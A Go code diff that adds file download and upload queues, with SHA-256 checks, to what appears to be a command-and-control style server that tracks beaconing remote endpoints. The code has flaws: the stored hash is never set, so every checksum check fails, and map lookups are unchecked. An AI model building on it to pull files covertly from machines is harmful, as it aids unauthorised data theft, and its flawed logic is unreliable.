@@ -2,22 +2,28 @@ package main
 
 import (
 	"bufio"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"errors"
 	"fmt"
+	"io"
 	"net"
+	"os"
 	"strconv"
 	"strings"
 )
 
 // Endpoint contains information relevant to tracking and communicating with remote endpoints
 type Endpoint struct {
-	Conn       net.Conn
-	Hostname   string
-	Commands   chan string
-	EndpointID string
-	MsgData    []string
-	AuthString string
+	Conn        net.Conn
+	Hostname    string
+	Commands    chan string
+	EndpointID  string
+	MsgData     []string
+	AuthString  string
+	FileQueue   map[string]*FileData
+	UploadQueue []string
 }
 
 // SaveData contains information relevant to saving Endpoint data to a file or database
@@ -27,6 +33,11 @@ type SaveData struct {
 	AuthString string
 }
 
+type FileData struct {
+	LocalPath string
+	ShaHash   string
+}
+
 // NewEndpoint will return a pointer to an Endpoint struct. If an Endpoint with its corresponding EndpointId already
 // exists in the servers Endpoints slice, then this pointer will be returned and the cached connection will be updated.
 // Otherwise, a new Endpoint struct will be created and added to the servers Endpoint slice, and this pointer will be
@@ -34,10 +45,12 @@ type SaveData struct {
 func NewEndpoint(s *Server, connection net.Conn, endpointId string) *Endpoint {
 	if e, err := s.GetEndpointById(endpointId); err != nil {
 		newEndpoint := &Endpoint{
-			Conn:       connection,
-			EndpointID: endpointId,
-			Commands:   make(chan string, 50),
-			MsgData:    []string{},
+			Conn:        connection,
+			EndpointID:  endpointId,
+			Commands:    make(chan string, 50),
+			MsgData:     []string{},
+			FileQueue:   make(map[string]*FileData),
+			UploadQueue: []string{},
 		}
 		s.AddEndpoint(newEndpoint)
 		return newEndpoint
@@ -147,6 +160,28 @@ func (e *Endpoint) BufferCommand(cmd string, args ...string) {
 	e.Commands <- builtCmd
 }
 
+func (e *Endpoint) AddFileQueue(remotePath string, localPath string) {
+	e.FileQueue[remotePath] = &FileData{
+		LocalPath: localPath,
+		ShaHash:   "",
+	}
+}
+
+func (e *Endpoint) AddUploadQueue(localPath string) {
+	e.UploadQueue = append(e.UploadQueue, localPath)
+}
+
+func (e *Endpoint) ClearUploadQueue() {
+	e.UploadQueue = []string{}
+}
+
+func (e *Endpoint) RemoveFileQueue(remotePath string) {
+	if _, exists := e.FileQueue[remotePath]; !exists {
+		return
+	}
+	delete(e.FileQueue, remotePath)
+}
+
 // verifyBeaconMessage will determine if the initial beacon packet contains the necessary information to continue
 // with communications
 func verifyBeaconMessage(msgType string, msgArgs []string) error {
@@ -157,8 +192,8 @@ func verifyBeaconMessage(msgType string, msgArgs []string) error {
 }
 
 func (e *Endpoint) processMessage(s *Server, msgType string, msgArgs []string) {
-	// If the message is not empty, or the message type is not IMSG, then log the message to the MsgData slice
-	if msgType != "" && msgType != "IMSG:" {
+	// If the message is not empty, and the message type is not IMSG or FILE, then log the message to the MsgData slice
+	if msgType != "" && msgType != "IMSG:" && msgType != "FILE:" {
 		msg := msgType
 		for _, s := range msgArgs {
 			msg += s
@@ -187,9 +222,85 @@ func (e *Endpoint) processMessage(s *Server, msgType string, msgArgs []string) {
 		case "PONG":
 			e.msgPong()
 			break
+		case "FILE":
+			e.msgFile(msgArgs)
+		case "UFILE":
+			e.msgUploadFile(msgArgs)
 		default:
 			fmt.Printf("unsupported message: %s\n", msgType+"\x02"+strings.Join(msgArgs, ""))
 		}
+		return
 	}
 
+	if msgType == "FILE:" {
+		if len(msgArgs) < 2 {
+			fmt.Println("malformed FILE payload")
+			return
+		}
+		e.handleFileDownload(msgArgs[0], msgArgs[1])
+	}
+	if msgType == "FILEEND:" {
+		if len(msgArgs) < 1 {
+			fmt.Println("malformed FILEEND payload", msgArgs)
+			return
+		}
+		e.handleFileDownloadEnd(msgArgs[0])
+	}
+
+}
+
+func (e *Endpoint) handleFileDownload(remotePath string, data string) {
+	// Check if the server expects this file
+	if _, exists := e.FileQueue[remotePath]; !exists {
+		fmt.Println("received a FILE payload, but the file was not expected")
+		return
+	}
+	// Get the localPath, fileHash sent by the client, and convert the base64 encoded string into bytes
+	localPath := e.FileQueue[remotePath].LocalPath
+	bytes, err := base64.StdEncoding.DecodeString(data)
+	if err != nil {
+		fmt.Println("err decoding file download: ", err)
+		return
+	}
+
+	// Open a new file handle, create the file if it does not exist.
+	file, err := os.OpenFile(localPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0755)
+	defer file.Close()
+	if err != nil {
+		fmt.Println("err opening file to be written: ", err)
+		return
+	}
+	_, err = file.Write(bytes)
+	if err != nil {
+		fmt.Println("err writing file: ", err)
+		file.Close()
+		return
+	}
+	// Commit to write changes
+	file.Sync()
+}
+
+func (e *Endpoint) handleFileDownloadEnd(remotePath string) {
+	localPath := e.FileQueue[remotePath].LocalPath
+	hash := e.FileQueue[remotePath].ShaHash
+	file, err := os.OpenFile(localPath, os.O_RDONLY, os.ModePerm)
+	defer file.Close()
+	if err != nil {
+		fmt.Println("err opening file handle to read file: ", err)
+		return
+	}
+	// Reset file handle
+	file.Seek(0, io.SeekStart)
+	// Calculate the sha-256 checksum of the written file
+	hasher := sha256.New()
+	if _, err := io.Copy(hasher, file); err != nil {
+		fmt.Println("err calculating checksum of file hash: ", err)
+		return
+	}
+	calculatedHash := hex.EncodeToString(hasher.Sum(nil))
+	if calculatedHash != hash {
+		fmt.Println("file downloaded, but there is a checksum mismatch L: ", calculatedHash, " R: ", hash)
+		return
+	}
+	e.RemoveFileQueue(remotePath)
 }
